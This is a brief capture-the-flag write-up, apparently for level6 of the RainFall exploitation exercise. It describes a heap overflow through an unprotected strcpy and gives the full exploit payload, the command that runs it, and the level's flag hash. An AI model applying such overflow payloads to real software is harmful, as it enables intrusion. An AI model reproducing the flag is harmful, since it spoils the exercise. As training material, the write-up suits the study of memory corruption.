# level6

This time, instead of stack overflow we do a heap overflow using an unprotected
`strcpy`. It's almost the same.

## The exploit

```bash
level6@RainFall:~$ echo -e "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ\x01\x01\x01\x01\x54\x84\x04\x08" > /tmp/exploit
level6@RainFall:~$ ./level6 $(cat /tmp/exploit)
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```